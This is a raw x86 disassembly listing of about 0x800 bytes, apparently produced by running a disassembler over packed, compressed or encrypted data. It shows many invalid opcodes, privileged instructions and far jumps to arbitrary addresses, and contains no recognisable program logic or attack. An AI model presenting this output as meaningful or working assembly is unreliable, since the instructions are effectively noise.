  425381:	lods   al,BYTE PTR ds:[esi]
  425382:	jbe    0x4253f3
  425384:	sub    BYTE PTR es:[ebp-0x1f9f6fe2],cl
  42538b:	popa   
  42538c:	sar    BYTE PTR [edx],cl
  42538e:	jno    0x4253f4
  425390:	and    dh,cl
  425392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425393:	retf   
  425394:	xchg   esp,eax
  425395:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  425397:	mul    cx
  42539a:	mov    BYTE PTR [eax+0x22aa3692],0x87
  4253a1:	inc    ebp
  4253a2:	xor    esi,eax
  4253a4:	int    0xec
  4253a6:	leave  
  4253a7:	mov    ch,0x12
  4253a9:	(bad)  
  4253aa:	std    
  4253ab:	adc    bh,bh
  4253ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253ae:	(bad)  
  4253af:	mov    ds:0xb8e68edc,eax
  4253b4:	push   esp
  4253b5:	call   0xed5a:0xd52c6189
  4253bc:	out    dx,eax
  4253bd:	mov    dl,0xc9
  4253bf:	dec    ecx
  4253c0:	xor    dl,BYTE PTR [esi-0xb]
  4253c3:	std    
  4253c4:	ins    BYTE PTR es:[edi],dx
  4253c5:	dec    BYTE PTR [ecx]
  4253c7:	test   BYTE PTR [edi+0x1d],ah
  4253ca:	call   0xc397:0xd45ad9dc
  4253d1:	es inc esi
  4253d3:	stos   DWORD PTR es:[edi],eax
  4253d4:	mov    edx,0x5dfc14e9
  4253d9:	adc    al,0x63
  4253db:	jne    0x4253ce
  4253dd:	and    BYTE PTR [ecx-0x17],dl
  4253e0:	inc    ebp
  4253e1:	xor    dl,BYTE PTR [eax+0x2e239f0d]
  4253e7:	mov    edi,esi
  4253e9:	stc    
  4253ea:	jmp    0x22e3222a
  4253ef:	push   esi
  4253f0:	lods   eax,DWORD PTR ds:[esi]
  4253f1:	sub    esp,DWORD PTR [esi-0x7d]
  4253f4:	push   es
  4253f5:	dec    edx
  4253f6:	inc    esp
  4253f7:	jae    0x425417
  4253f9:	pop    ss
  4253fa:	add    al,0x5d
  4253fc:	push   esp
  4253fd:	mov    edi,0x38e628f7
  425402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425403:	lods   al,BYTE PTR ds:[esi]
  425404:	in     al,0x89
  425406:	(bad)  
  425407:	adc    al,0x31
  425409:	or     esp,esp
  42540b:	inc    esp
  42540c:	mov    eax,0xe79d35d7
  425411:	lahf   
  425412:	jo     0x425486
  425414:	fst    QWORD PTR [ebx+0x449459b6]
  42541a:	pop    esi
  42541b:	and    esp,DWORD PTR [ebx]
  42541d:	sub    eax,0xdbbefed2
  425422:	mov    ch,0x21
  425424:	addr16 (bad) 
  425426:	and    DWORD PTR [ecx+0x112a9a85],edi
  42542c:	fs popa 
  42542e:	inc    ebx
  42542f:	sub    BYTE PTR [ecx],bh
  425431:	ror    BYTE PTR [edx],1
  425433:	jp     0x4253bd
  425435:	or     bl,bl
  425437:	mov    al,BYTE PTR [ebp-0x5]
  42543a:	shr    DWORD PTR [edx+0x55],0x3b
  42543e:	and    al,0x72
  425440:	and    ecx,DWORD PTR [esi-0x4938fc08]
  425446:	je     0x4253dd
  425448:	sub    BYTE PTR [eax],ch
  42544a:	stos   DWORD PTR es:[edi],eax
  42544b:	(bad)  
  42544c:	cmp    edx,DWORD PTR [ecx]
  42544e:	aas    
  42544f:	rcl    BYTE PTR [ebp+0x1d43868e],0x6
  425456:	loope  0x42544e
  425458:	shl    DWORD PTR [ebx],cl
  42545a:	inc    ecx
  42545b:	sub    BYTE PTR [esi+0x67],dh
  42545e:	fmul   QWORD PTR [edi-0x66c23de]
  425464:	jns    0x425422
  425466:	pop    ebx
  425467:	icebp  
  425468:	mov    ds:0x387da1f0,al
  42546d:	and    ch,0xf9
  425470:	and    edx,DWORD PTR [edx+0x62bfb1eb]
  425476:	sub    BYTE PTR [edi+ebp*8],0xa
  42547a:	xor    DWORD PTR [edi+0x5],0xfe78c22e
  425481:	xchg   esi,ebp
  425483:	test   BYTE PTR [eax-0x21],0x7d
  425487:	sbb    esi,DWORD PTR [ecx-0x52]
  42548a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42548b:	xchg   ebx,eax
  42548c:	retf   0x7ac1
  42548f:	aad    0xf8
  425491:	call   0x41ff:0xff9adf6
  425498:	mov    edx,0x431c3e28
  42549d:	and    eax,0x1757cb9b
  4254a2:	xchg   esi,eax
  4254a3:	cmp    eax,0x2c177255
  4254a8:	scas   al,BYTE PTR es:[edi]
  4254a9:	push   ss
  4254aa:	imul   edx,DWORD PTR [esi+0x6445d698],0x265f36a2
  4254b4:	imul   eax,DWORD PTR [edi-0x61bc5386],0x37
  4254bb:	adc    eax,DWORD PTR [ebx]
  4254bd:	fcmovne st,st(7)
  4254bf:	jne    0x425475
  4254c1:	out    dx,al
  4254c2:	(bad)  
  4254c3:	hlt    
  4254c4:	call   0xc741:0xfa0a2dd3
  4254cb:	or     eax,0x3ac604a5
  4254d0:	dec    edi
  4254d1:	push   ebx
  4254d2:	add    esp,DWORD PTR [eax]
  4254d4:	jb     0x4254da
  4254d6:	out    0xc,al
  4254d8:	icebp  
  4254d9:	push   ebp
  4254da:	jns    0x4254fb
  4254dc:	cmp    BYTE PTR [ebx-0x72],0x25
  4254e0:	sbb    ecx,esi
  4254e2:	test   al,0x69
  4254e4:	push   0xfffffff5
  4254e6:	jle    0x425513
  4254e8:	hlt    
  4254e9:	mov    BYTE PTR [edi-0x3b04c6fc],ah
  4254ef:	mov    dh,0x19
  4254f1:	mov    bl,0xf9
  4254f3:	xor    edi,DWORD PTR [ebx]
  4254f5:	cmp    ebx,DWORD PTR [ecx]
  4254f7:	(bad)  
  4254f8:	stos   BYTE PTR es:[edi],al
  4254f9:	dec    ebx
  4254fa:	dec    ecx
  4254fb:	fdiv   DWORD PTR [ebp-0x31afec50]
  425501:	popf   
  425502:	pusha  
  425503:	sbb    ebp,DWORD PTR [eax]
  425505:	sbb    dl,0x68
  425508:	jp     0x425510
  42550a:	imul   ebx,DWORD PTR [edi+0x5a],0xa6e82d58
  425511:	xor    eax,0x78edeff8
  425516:	pusha  
  425517:	sbb    BYTE PTR [bx+si],dh
  42551a:	push   ebx
  42551b:	enter  0x3f6,0x57
  42551f:	cwde   
  425520:	push   cs
  425521:	or     DWORD PTR [ebp+0x6d989439],eax
  425527:	aas    
  425528:	cmp    DWORD PTR [edi+0x20],edi
  42552b:	inc    esi
  42552c:	addr16 ret 0x4970
  425530:	dec    esi
  425531:	inc    edi
  425533:	loope  0x425590
  425535:	adc    DWORD PTR [ebx+0x54],esi
  425538:	push   edi
  425539:	cmp    BYTE PTR [edi],0xb
  42553c:	(bad)  
  42553e:	dec    eax
  42553f:	sbb    edi,edx
  425541:	ret    0x430c
  425544:	push   0xffffffdf
  425546:	push   0x51
  425548:	sub    DWORD PTR [edi-0x67e35c2c],0x3b6db730
  425552:	pop    eax
  425553:	fstp   TBYTE PTR [edx]
  425555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425556:	std    
  425557:	sbb    eax,0x66240d45
  42555c:	mov    edi,0x4e95dc47
  425561:	jnp    0x425591
  425563:	dec    edx
  425564:	fistp  WORD PTR [esi-0x7e]
  425567:	les    esi,FWORD PTR [esi-0x58fdea9a]
  42556d:	call   0xa391982d
  425572:	push   esi
  425573:	out    dx,eax
  425574:	sbb    ebx,DWORD PTR [ecx-0x2822c899]
  42557a:	lea    edx,[edi]
  42557c:	mov    ecx,0xfdf8bab8
  425581:	xchg   bl,ah
  425583:	inc    edx
  425584:	cli    
  425585:	adc    bl,BYTE PTR [ebp+0x52635da4]
  42558b:	aas    
  42558c:	cmc    
  42558d:	das    
  42558e:	jae    0x4255c1
  425590:	test   al,0xec
  425592:	push   edx
  425593:	xor    ebp,ecx
  425595:	xor    al,0x17
  425597:	fdivr  QWORD PTR [ecx+0x35e1cf11]
  42559d:	fcmovnbe st,st(5)
  42559f:	int3   
  4255a0:	push   ebx
  4255a1:	xchg   ebx,eax
  4255a2:	test   BYTE PTR [ebx+0x72aed280],ah
  4255a8:	aam    0x9d
  4255aa:	sub    BYTE PTR [edx-0x58516611],cl
  4255b0:	inc    ebp
  4255b1:	or     BYTE PTR [esi],bh
  4255b3:	ds mov edx,0x997e1b84
  4255b9:	in     al,0x8a
  4255bb:	add    al,0xf0
  4255bd:	pop    ss
  4255be:	jge    0x425637
  4255c0:	mov    al,0x55
  4255c2:	aaa    
  4255c3:	or     al,0x82
  4255c5:	xchg   ebx,eax
  4255c6:	ss gs test eax,0xd57e3801
  4255cd:	sbb    al,0x91
  4255cf:	ficomp WORD PTR [ecx]
  4255d1:	rcr    DWORD PTR [eax],0x5c
  4255d4:	inc    edi
  4255d5:	mov    esi,0xca0795e4
  4255da:	cmc    
  4255db:	push   edx
  4255dc:	mov    ds:0x9cde5624,al
  4255e1:	pop    ecx
  4255e2:	cmp    DWORD PTR [edi+0x7fc9d1c8],ebp
  4255e8:	pushf  
  4255e9:	sbb    eax,0x8e9bd3be
  4255ee:	aam    0xf0
  4255f0:	pop    edi
  4255f1:	je     0x425639
  4255f3:	sar    dl,0x24
  4255f6:	mov    es,WORD PTR [eax-0x74]
  4255f9:	ins    BYTE PTR es:[edi],dx
  4255fa:	inc    eax
  4255fb:	pop    ecx
  4255fc:	pop    esp
  4255fd:	test   BYTE PTR [ebp+0x36],bh
  425600:	mov    ecx,0x3ecb4dd0
  425605:	xchg   BYTE PTR [edx-0xa],bh
  425608:	pop    es
  425609:	fcmovnbe st,st(5)
  42560b:	lods   al,BYTE PTR ds:[esi]
  42560c:	jmp    0x4255d0
  42560e:	and    eax,0xbb7e2e6f
  425613:	loope  0x4255bd
  425615:	stos   BYTE PTR es:[edi],al
  425616:	iret   
  425617:	jae    0x425660
  425619:	adc    al,0xfa
  42561b:	shl    BYTE PTR [ebp+0x7129b5bd],1
  425621:	xor    DWORD PTR [ebx],ebp
  425623:	in     eax,dx
  425624:	xor    al,0x35
  425626:	call   0x1f1e:0xe2d32896
  42562d:	and    eax,0x144b6fd1
  425632:	lods   al,BYTE PTR ds:[esi]
  425633:	pop    ss
  425634:	fs cs push es
  425637:	ret    
  425638:	mov    dl,0x27
  42563a:	dec    esp
  42563b:	add    al,0xbb
  42563d:	cli    
  42563e:	test   al,0xa7
  425640:	(bad)  
  425641:	std    
  425642:	and    al,0x7b
  425644:	mov    esi,DWORD PTR [esi+0x3d]
  425647:	push   0xc225b3d
  42564c:	mov    eax,ds:0xd70e4527
  425651:	fisttp DWORD PTR [eax]
  425653:	out    0x2f,eax
  425655:	cmc    
  425656:	mov    eax,ds:0xdc711975
  42565b:	inc    edx
  42565c:	stc    
  42565d:	fld    TBYTE PTR [ebx-0x68]
  425660:	test   DWORD PTR [eax+0x16],ebp
  425663:	cs pop esp
  425665:	imul   edx,DWORD PTR [edx],0x4a7e1351
  42566b:	nop
  42566c:	mov    ds:0xb794bd98,eax
  425671:	cmp    cl,bl
  425673:	dec    edx
  425674:	call   0x19b50209
  425679:	sub    esp,DWORD PTR [edi]
  42567b:	inc    esi
  42567c:	fisub  WORD PTR [ebx]
  42567e:	test   al,0x12
  425680:	inc    eax
  425681:	sbb    al,0xea
  425683:	data16 cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  425686:	xor    DWORD PTR [ebp+0x488e412b],edi
  42568c:	repnz adc BYTE PTR [ebp+0x52],al
  425690:	xor    ecx,DWORD PTR [eax-0x6e]
  425693:	push   eax
  425694:	inc    eax
  425695:	sub    BYTE PTR [esi-0xd],dl
  425698:	sbb    DWORD PTR [edx+0x6332f94d],0xffffff8d
  42569f:	je     0x42564e
  4256a1:	jno    0x425639
  4256a3:	(bad)  
  4256a4:	cli    
  4256a5:	out    0x90,al
  4256a7:	jmp    0x19e5d128
  4256ac:	lock rcr BYTE PTR [ebx],1
  4256af:	mov    ebp,0x30f523c6
  4256b4:	fwait
  4256b5:	push   0x37
  4256b7:	push   edi
  4256b8:	jge    0x4256fa
  4256ba:	inc    edx
  4256bb:	imul   ecx,DWORD PTR ds:0x644de9bf,0xb1f0931d
  4256c5:	add    ebx,DWORD PTR [ecx]
  4256c7:	and    esi,DWORD PTR [edi]
  4256c9:	outs   dx,BYTE PTR ds:[esi]
  4256ca:	dec    esp
  4256cb:	fist   WORD PTR [ebx]
  4256cd:	arpl   WORD PTR [ebp-0x48285630],di
  4256d3:	pop    esi
  4256d4:	push   eax
  4256d5:	xor    BYTE PTR [edx-0x7],cl
  4256d8:	aad    0xe5
  4256da:	adc    cl,BYTE PTR [eax-0x66727092]
  4256e0:	into   
  4256e1:	sub    cl,al
  4256e3:	mov    eax,ecx
  4256e5:	jg     0x4256e4
  4256e7:	dec    eax
  4256e8:	lods   eax,DWORD PTR ds:[esi]
  4256e9:	adc    al,0xbd
  4256eb:	add    eax,0x9c8d7c3b
  4256f0:	mov    ecx,DWORD PTR [ecx+ecx*2+0x3f]
  4256f4:	cli    
  4256f5:	fs je  0x425734
  4256f8:	xor    eax,0x2f503ad
  4256fd:	stos   DWORD PTR es:[edi],eax
  4256fe:	or     cl,ch
  425700:	inc    edi
  425701:	lods   eax,DWORD PTR ds:[esi]
  425702:	mov    al,ds:0x7ee59b95
  425707:	adc    eax,0x9c3debab
  42570c:	xchg   ecx,eax
  42570d:	cmc    
  42570e:	jb     0x4256bf
  425710:	push   eax
  425711:	push   edx
  425712:	arpl   WORD PTR [ecx-0x5fbc6b7c],cx
  425718:	es push edx
  42571a:	mov    ch,0x67
  42571c:	call   0x1aa:0xa3a0ce70
  425723:	sbb    eax,0x70d5c39b
  425728:	sbb    eax,0x2db17aef
  42572d:	lahf   
  42572e:	mov    bh,BYTE PTR [edi+0x2132f3b7]
  425734:	(bad)  
  425735:	lock cdq 
  425737:	dec    esp
  425738:	scas   al,BYTE PTR es:[edi]
  425739:	and    ah,BYTE PTR [edi]
  42573b:	not    edi
  42573d:	xor    ecx,DWORD PTR [eax+eax*1]
  425740:	xchg   ebp,eax
  425741:	inc    eax
  425742:	dec    esi
  425743:	xor    bl,bl
  425745:	cs mov esp,0xab9ee242
  42574b:	and    BYTE PTR [ebx],dl
  42574d:	sub    eax,0x7a826bc5
  425752:	sti    
  425753:	lahf   
  425754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425755:	adc    BYTE PTR [ebp-0x7258366a],0x7d
  42575c:	imul   ebx,DWORD PTR [edi-0x451df3e7],0xfffffff4
  425763:	inc    ebx
  425764:	test   eax,0x81bb8cca
  425769:	lock push ebx
  42576b:	retf   0x3e47
  42576e:	mov    cl,0x47
  425770:	jbe    0x425744
  425772:	ins    BYTE PTR es:[edi],dx
  425773:	fmul   st(5),st
  425775:	jmp    0x49da:0x86b0ed3b
  42577c:	out    dx,al
  42577d:	push   cs
  42577e:	fnstcw WORD PTR [ebx]
  425780:	lahf   
  425781:	ins    DWORD PTR es:[edi],dx
  425782:	lock sbb al,0xf6
  425785:	add    ch,BYTE PTR [edx]
  425787:	sbb    BYTE PTR [edi+0x4231d071],ch
  42578d:	push   cs
  42578e:	pop    edx
  42578f:	fsub   DWORD PTR [esi-0x75fa42cd]
  425795:	and    BYTE PTR [ebx],ah
  425797:	add    BYTE PTR [ebp+0x72],bl
  42579a:	push   edi
  42579b:	add    eax,0x3c36b0a2
  4257a0:	push   eax
  4257a1:	mov    DWORD PTR [eax],eax
  4257a3:	add    BYTE PTR [eax],al
  4257a5:	add    BYTE PTR [eax],al
  4257a7:	add    BYTE PTR [eax],al
  4257a9:	add    BYTE PTR [edx+0x43],cl
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	push   cs
  4257b9:	cmp    DWORD PTR [eax-0x1b],edx
  4257bc:	add    DWORD PTR [eax],eax
  4257be:	add    BYTE PTR [esi],0x0
  4257c1:	add    BYTE PTR [esi+0x70],al
  4257c4:	in     eax,dx
  4257c5:	mov    WORD PTR [ebx+0x15f7a26b],fs
  4257cb:	jg     0x4257a6
  4257cd:	add    ecx,DWORD PTR [edx-0x4a1c516]
  4257d3:	push   ebp
  4257d4:	in     al,dx
  4257d5:	inc    ebx
  4257d6:	add    BYTE PTR [edi],bl
  4257d8:	js     0x425840
  4257da:	push   esi
  4257db:	iret   
  4257dc:	loopne 0x4257bc
  4257de:	dec    eax
  4257df:	sahf   
  4257e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257e1:	aam    0x4b
  4257e3:	xor    DWORD PTR gs:[eax-0x4583d6b6],eax
  4257ea:	sbb    DWORD PTR [ebp+0x4af4831],0xffffffe0
  4257f1:	ror    eax,1
  4257f3:	clc    
  4257f4:	xchg   ecx,eax
  4257f5:	loope  0x42581e
  4257f7:	rcr    DWORD PTR [ecx+0x62],1
  4257fa:	je     0x42584e
  4257fc:	xor    esi,DWORD PTR [esi+0x5c7bae2a]
  425802:	stc    
  425803:	jle    0x425879
  425805:	inc    eax
  425806:	push   es
  425807:	sbb    al,0xc4
  425809:	test   BYTE PTR ds:[ecx-0x61],al
  42580d:	mov    BYTE PTR [edi+0x6b],ch
  425810:	jge    0x4257d0
  425812:	aaa    
  425813:	aas    
  425814:	jb     0x4257b5
  425816:	rcl    BYTE PTR [edx],1
  425818:	nop
  425819:	mov    cs,ebp
  42581b:	mov    al,ds:0x32095af8
  425820:	pop    edi
  425821:	(bad)  
  425822:	and    eax,0xf6f12b38
  425827:	sbb    BYTE PTR [esi],bh
  425829:	cdq    
  42582a:	cmp    DWORD PTR [edi-0x32374670],ecx
  425830:	dec    edi
  425831:	sub    esi,eax
  425833:	(bad)  
  425834:	jmp    0x425892
  425836:	stos   DWORD PTR es:[edi],eax
  425837:	cmp    ecx,edx
  425839:	add    eax,0x875566b
  42583e:	ret    
  42583f:	xchg   DWORD PTR [ebx],eax
  425841:	inc    esi
  425842:	mov    WORD PTR [edx],cs
  425844:	sahf   
  425845:	mov    esi,0xd076145a
  42584a:	stos   DWORD PTR es:[edi],eax
  42584b:	inc    ecx
  42584c:	xchg   esi,eax
  42584d:	push   0x68
  42584f:	inc    ebx
  425850:	or     DWORD PTR [eax+ebx*1+0x25],edi
  425854:	idiv   dh
  425856:	jo     0x42587e
  425858:	pop    edx
  425859:	inc    ebx
  42585a:	lahf   
  42585b:	daa    
  42585c:	loope  0x425864
  42585e:	mov    eax,0xd63bf32b
  425863:	mov    cl,0x96
  425865:	fild   DWORD PTR [edx-0x5]
  425868:	mov    ecx,0x1fc27e97
  42586d:	js     0x425883
  42586f:	jb     0x425842
  425871:	cmp    eax,0x4858a63
  425876:	jno    0x425879
  425878:	push   ebx
  425879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42587a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42587b:	or     al,0xf3
  42587d:	sub    eax,0xda26bf5e
  425882:	repnz fsubr DWORD PTR gs:[edi]
  425886:	js     0x4258d3
  425888:	(bad)  
  425889:	dec    esp
  42588a:	dec    ebx
  42588b:	clc    
  42588c:	xchg   ecx,eax
  42588d:	xor    eax,0x5fe0c263
  425892:	scas   al,BYTE PTR es:[edi]
  425893:	test   al,0xfe
  425895:	sub    edi,DWORD PTR [edi+0x60]
  425898:	sbb    ebp,DWORD PTR [eax-0x4184804d]
  42589e:	aad    0x51
  4258a0:	test   DWORD PTR [ecx-0x7b],ecx
  4258a3:	popf   
  4258a4:	mov    bl,ah
  4258a6:	mov    al,ds:0x6059b83a
  4258ab:	test   al,0x1b
  4258ad:	xor    ebp,esi
  4258af:	xor    bl,BYTE PTR [ebx+ecx*1-0x7b]
  4258b3:	ins    DWORD PTR es:[edi],dx
  4258b4:	bound  esp,QWORD PTR [edi]
  4258b6:	arpl   WORD PTR [edx+0x69868595],ax
  4258bc:	jmp    0x9df5:0xd8fd1503
  4258c3:	pop    ss
  4258c4:	in     al,dx
  4258c5:	jae    0x4258af
  4258c7:	shl    DWORD PTR [eax],1
  4258c9:	addr16 xchg edi,eax
  4258cb:	jbe    0x42587b
  4258cd:	mov    DWORD PTR [ebp-0x500ea544],ebp
  4258d3:	mov    ch,BYTE PTR [edx-0x67f59d93]
  4258d9:	xor    bh,al
  4258db:	cmc    
  4258dc:	push   ecx
  4258dd:	sbb    BYTE PTR [esi+ebp*2],bl
  4258e0:	fdiv   st(5),st
  4258e2:	cmp    eax,0xe3954600
  4258e7:	imul   ebx,ecx,0xa450c1b6
  4258ed:	les    ecx,FWORD PTR [esi+0x24dd3aaa]
  4258f3:	data16 jno 0x4258dc
  4258f6:	dec    ecx
  4258f7:	mov    bh,0x15
  4258f9:	push   es
  4258fa:	(bad)  
  4258fb:	dec    eax
  4258fc:	sbb    al,0x48
  4258fe:	iret   
  4258ff:	jl     0x425895
  425901:	std    
  425902:	aad    0xb
  425904:	clc    
  425905:	mov    dl,0x26
  425907:	dec    edi
  425908:	adc    DWORD PTR [ecx-0x46],ebx
  42590b:	lods   al,BYTE PTR ds:[esi]
  42590c:	stc    
  42590d:	enter  0xfd31,0xd1
  425911:	push   ebx
  425912:	xor    eax,0xd69530cc
  425917:	mov    eax,?
  425919:	dec    esi
  42591a:	out    dx,eax
  42591b:	adc    al,0xf0
  42591e:	loope  0x425918
  425920:	fwait
  425921:	mov    esp,0x467a503e
  425926:	aas    
  425927:	enter  0xe583,0x34
  42592b:	iret   
  42592c:	lods   al,BYTE PTR ds:[esi]
  42592d:	or     esi,edi
  42592f:	ud0    edx,DWORD PTR [edx+0x21f5daeb]
  425936:	lods   eax,DWORD PTR ds:[esi]
  425937:	xor    bh,BYTE PTR [ebp-0x43162d48]
  42593d:	xchg   BYTE PTR [edx+0x65],dh
  425940:	aaa    
  425941:	mov    edi,0xb8049bf0
  425946:	sahf   
  425947:	into   
  425948:	xor    eax,0xfa9cd9bc
  42594d:	(bad)  
  42594f:	ds fwait
  425951:	in     al,dx
  425952:	and    eax,0x19fff4b7
  425957:	push   ebx
  425958:	pop    ebp
  425959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42595a:	jmp    0x206942d9
  42595f:	jge    0x42599d
  425961:	ret    0x641b
  425964:	xchg   edx,eax
  425965:	nop
  425966:	sbb    ah,BYTE PTR [eax]
  425968:	sahf   
  425969:	std    
  42596a:	int3   
  42596b:	out    dx,al
  42596c:	adc    DWORD PTR [ebx-0x1f0299e2],ecx
  425972:	lea    esp,ds:0xe2c4e48a
  425978:	add    al,0xd8
  42597a:	fnsave [eax-0x5934dd5a]
  425980:	imul   ecx,DWORD PTR [edx-0x6ac3392],0x3b
  425987:	push   0xffffffa4
  425989:	out    dx,al
  42598a:	jp     0x4259a2
  42598c:	leave  
  42598d:	and    eax,0xebf35ae3
  425992:	mov    esi,0xa4d7aaa8
  425997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425998:	jb     0x4259bc
  42599a:	out    dx,al
  42599b:	out    0xb7,eax
  42599d:	pop    ebx
  42599e:	mov    ds:0x4f26a335,eax
  4259a3:	mov    edi,edi
  4259a5:	mov    WORD PTR [ecx-0x58],fs
  4259a8:	repnz bnd jle 0x4259fa
  4259ac:	dec    esp
  4259ad:	jns    0x425972
  4259af:	jo     0x4259db
  4259b1:	cmp    ebp,DWORD PTR [ebx+edi*4]
  4259b4:	add    cl,BYTE PTR [edi+ecx*4-0x643e8473]
  4259bb:	jg     0x39a820c5
  4259c1:	inc    esi
  4259c2:	add    al,0xd4
  4259c4:	outs   dx,DWORD PTR ds:[esi]
  4259c5:	test   eax,0xc8484744
  4259ca:	mov    ds:0x7f52f091,al
  4259cf:	int    0x2b
  4259d1:	ins    DWORD PTR es:[edi],dx
  4259d2:	mov    cl,0x23
  4259d4:	jg     0x42598a
  4259d6:	or     eax,0xb0743ca4
  4259db:	dec    ebp
  4259dc:	push   es
  4259dd:	jge    0x4259a4
  4259df:	adc    bl,al
  4259e1:	addr16 mov ebx,0x98b6cbf4
  4259e7:	sti    
  4259e8:	adc    eax,0x1ea956eb
  4259ed:	pop    ds
  4259ee:	pop    ecx
  4259ef:	aaa    
  4259f0:	add    al,ah
  4259f2:	ins    DWORD PTR es:[edi],dx
  4259f3:	cmp    eax,0xcaacad11
  4259f8:	and    al,0xbf
  4259fa:	xchg   edx,eax
  4259fb:	dec    ebx
  4259fc:	clc    
  4259fd:	gs inc eax
  4259ff:	or     DWORD PTR [edx+eax*8+0x33d29f25],esp
  425a06:	shr    edx,cl
  425a08:	push   esp
  425a09:	sbb    DWORD PTR [edi-0x3e],ebp
  425a0c:	pop    esi
  425a0d:	mov    dh,0xad
  425a0f:	mov    ebx,0xbc6e50a9
  425a14:	cmp    ebp,DWORD PTR [ecx]
  425a16:	mov    edi,0x2f6f2e95
  425a1b:	dec    eax
  425a1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a1d:	aaa    
  425a1e:	xchg   BYTE PTR [edx+ecx*1-0x3c67be41],al
  425a25:	jmp    0x8515:0x1d8a2d28
  425a2c:	and    dh,ch
  425a2e:	xchg   edi,eax
  425a2f:	and    bh,BYTE PTR [ecx+0x1ddf8833]
  425a35:	(bad)  
  425a36:	xor    DWORD PTR ds:0x23c97457,edi
  425a3c:	push   edx
  425a3d:	sbb    eax,ebp
  425a3f:	hlt    
  425a40:	sti    
  425a41:	cld    
  425a42:	outs   dx,BYTE PTR ds:[esi]
  425a43:	mov    ecx,0xdc8cbfb5
  425a48:	fs or  ebx,esi
  425a4b:	dec    ecx
  425a4c:	dec    ebx
  425a4d:	nop
  425a4e:	ins    DWORD PTR es:[edi],dx
  425a4f:	repnz mov esi,DWORD PTR [edi+eax*2]
  425a53:	pop    DWORD PTR [ecx+edi*2-0x60fad67c]
  425a5a:	mov    ebx,edi
  425a5c:	mov    dl,0x17
  425a5e:	xor    eax,0x59635bac
  425a63:	sbb    BYTE PTR [edx],al
  425a65:	repz adc bh,bl
  425a68:	pop    eax
  425a69:	sub    BYTE PTR [ebx+0x36],0x83
  425a6d:	sbb    BYTE PTR [ebx+eax*4-0xf64169],ah
  425a74:	cs scas eax,DWORD PTR es:[edi]
  425a76:	xor    BYTE PTR [ecx],0x84
  425a79:	jecxz  0x425aa0
  425a7b:	xchg   ecx,eax
  425a7c:	mov    ds:0xa35dc57,eax
  425a81:	retf   
  425a82:	mov    dl,0xf5
  425a84:	and    ebx,edx
  425a86:	mov    edi,0x9738ad8d
  425a8b:	sbb    edx,DWORD PTR [esi+0x41]
  425a8e:	fs stos BYTE PTR es:[edi],al
  425a90:	jp     0x425a6b
  425a92:	out    0x2c,al
  425a94:	imul   esi,DWORD PTR [ecx],0xe2f84793
  425a9a:	rcl    dl,cl
  425a9c:	rol    BYTE PTR [ebx+0x5bbd6b86],0x71
  425aa3:	cmp    eax,0xeee7747a
  425aa8:	sub    ah,ch
  425aaa:	iret   
  425aab:	and    al,0x56
  425aad:	aam    0xc8
  425aaf:	dec    edi
  425ab0:	repnz retf 
  425ab2:	jo     0x425b23
  425ab4:	lods   al,BYTE PTR ds:[esi]
  425ab5:	jo     0x425aa2
  425ab7:	push   ecx
  425ab8:	lods   eax,DWORD PTR ds:[esi]
  425ab9:	push   es
  425aba:	enter  0xf15c,0x3f
  425abe:	das    
  425abf:	mov    gs,WORD PTR [edx-0x75]
  425ac2:	lea    eax,[ebx]
  425ac4:	jmp    0x425a85
  425ac6:	sub    eax,0xac39f04b
  425acb:	outs   dx,BYTE PTR ss:[esi]
  425acd:	loope  0x425b43
  425acf:	test   al,0x98
  425ad1:	jp     0x425ad4
  425ad3:	jb     0x425ad2
  425ad5:	push   0x222c0ae7
  425ada:	adc    al,0xb0
  425adc:	cmp    dh,dh
  425ade:	jae    0x425ade
  425ae0:	sbb    dl,BYTE PTR [ebx+esi*4-0x1d]
  425ae4:	jne    0x425ae5
  425ae6:	fs jmp 0xebed:0x80273b62
  425aee:	outs   dx,BYTE PTR ds:[esi]
  425aef:	push   ds
  425af0:	inc    edi
  425af1:	ja     0x425b4e
  425af3:	(bad)  
  425af4:	push   esp
  425af5:	inc    esi
  425af6:	mov    cl,0x26
  425af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425af9:	(bad)  
  425afa:	fsubr  DWORD PTR [eax-0x594b7f21]
  425b00:	ror    BYTE PTR [ebx],0x7
  425b03:	jg     0x425af7
  425b05:	imul   ecx,DWORD PTR [esi+0x7d75a8f1],0x2a555a66
  425b0f:	loopne 0x425ae3
  425b11:	cmp    eax,0xe7ddf2be
  425b16:	adc    esp,DWORD PTR [edx+0x13]
  425b19:	adc    eax,0x7f203f37
  425b1e:	call   0xb581:0x3430b36b
  425b25:	xchg   BYTE PTR [ebp-0x66],cl
  425b28:	inc    ecx
  425b29:	xchg   BYTE PTR [esi+0xf],bh
  425b2c:	xchg   ebp,eax
  425b2d:	lds    edi,FWORD PTR [ecx-0x64]
  425b30:	push   edx
  425b31:	aad    0xfe
  425b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b34:	dec    esp
  425b35:	jmp    0xc6f07f9e
  425b3a:	(bad)  
  425b3b:	(bad)  
  425b3c:	lock adc ecx,DWORD PTR ds:0x1d1894ca
  425b43:	adc    al,0xfb
  425b45:	aad    0xb4
  425b47:	inc    esi
  425b48:	mov    dh,0xff
  425b4a:	or     al,BYTE PTR [eax+0x6c]
  425b4d:	std    
  425b4e:	dec    eax
  425b4f:	aad    0xb4
  425b51:	fwait
  425b52:	scas   eax,DWORD PTR es:[edi]
  425b53:	push   es
  425b54:	retf   0x3b20
  425b57:	jmp    0x26d7:0x957a640
